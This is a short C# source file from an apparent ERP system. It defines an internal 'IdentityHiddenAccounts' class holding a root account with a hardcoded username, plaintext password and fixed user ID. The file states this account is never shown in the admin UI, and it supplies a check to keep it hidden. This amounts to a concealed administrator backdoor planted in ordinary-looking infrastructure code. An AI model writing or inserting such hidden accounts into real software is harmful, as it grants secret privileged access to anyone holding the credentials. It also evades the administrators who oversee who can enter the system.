namespace ERPSystem.Infrastructure.Security;

/// <summary>Internal-only bootstrap account; never surfaced in admin UI.</summary>
internal static class IdentityHiddenAccounts
{
    internal const string RootUsername = "homsi";
    internal const string RootPassword = "700210ww";
    internal static readonly Guid RootUserId = Guid.Parse("77777777-7777-7777-7777-777777777777");

    internal static bool IsHidden(string username) =>
        username.Equals(RootUsername, StringComparison.OrdinalIgnoreCase);
}
